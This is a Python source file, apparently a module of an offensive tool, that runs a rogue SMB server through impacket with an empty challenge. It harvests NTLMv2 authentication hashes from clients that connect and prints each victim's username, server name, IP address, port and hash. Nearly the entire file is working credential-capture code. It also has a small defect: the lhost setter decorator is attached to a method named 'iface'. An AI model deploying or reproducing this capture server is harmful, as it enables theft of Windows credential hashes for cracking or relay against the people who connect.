from threading import Thread
from impacket import smbserver
from io import StringIO
import logging
import sys
from .interceptlogging import InterceptHandler
from time import sleep
import re


class SmbServer:
    def __init__(self, lhost: str, port: str, output=sys.stdout) -> None:
        self._lhost = lhost
        self._port = port
        self._output = output
        self._log_stream = StringIO()
        self._users_collected = []

        logging.basicConfig(handlers=[InterceptHandler()], level=0)
        console = logging.StreamHandler(self.log_stream)
        console.setLevel(logging.INFO)
        logging.getLogger("").addHandler(console)

    @property
    def users_collected(self):
        return self._users_collected

    @users_collected.setter
    def users_collected(self, new_user):
        self._users_collected.append(new_user)

    @property
    def log_stream(self):
        return self._log_stream

    @property
    def lhost(self) -> str:
        return self._lhost

    @property
    def port(self) -> str:
        return self._port

    @property
    def output(self):
        return self._output

    @lhost.setter
    def iface(self, lhost: str) -> None:
        self._lhost = lhost

    @port.setter
    def port(self, port) -> None:
        self._port = port

    @output.setter
    def output(self, output) -> None:
        self._output = output

    @log_stream.setter
    def log_stream(self, stream):
        self._log_stream = stream

    def generate_output(self):
        pattern_for_ntlmv2_hash = re.compile(r'.*::.*')
        pattern_for_user_info = re.compile(r"AUTHENTICATE_MESSAGE .*")
        pattern_for_connection_info = re.compile(r"Incoming connection .*")

        ntlmv2_matches = pattern_for_ntlmv2_hash.findall(self.log_stream.getvalue())
        connection_info_matches = pattern_for_connection_info.findall(self.log_stream.getvalue())
        user_info_matches = pattern_for_user_info.findall(self.log_stream.getvalue())

        for i, match in enumerate(ntlmv2_matches):
            normalize_user_info = user_info_matches[i].split()[1].replace("(","").replace(')','').split(",")
            user = normalize_user_info[0]
            server_name = normalize_user_info[1]
            if user not in self.users_collected:
                normalize_connection_info = connection_info_matches[i].split()[2].replace('(' , '').replace(')',"").split(",")
                remote_ip = normalize_connection_info[0]
                remote_port = normalize_connection_info[1]

                print(f"User: {user} Server Name:{server_name}")
                print(f"IP: {remote_ip} remote_port: {remote_port}")
                print(f"NTLMv2: {match}")
                self.users_collected = user
                print(self.users_collected)
            else:
                print(f"NTLMv2 hash of user {user} shown above")

    def show_ntlmv2(self):
        while True:
            sleep(2)
            if self.log_stream.getvalue() != "":
                self.generate_output()

    def start_smbserver(self) -> None:
        show_ntlmv2_thread = Thread(target=self.show_ntlmv2)
        show_ntlmv2_thread.daemon = True
        show_ntlmv2_thread.start()

        server = smbserver.SimpleSMBServer(
            listenAddress=self.lhost, listenPort=int(self.port)
        )
        server.setSMBChallenge("")
        server.start()
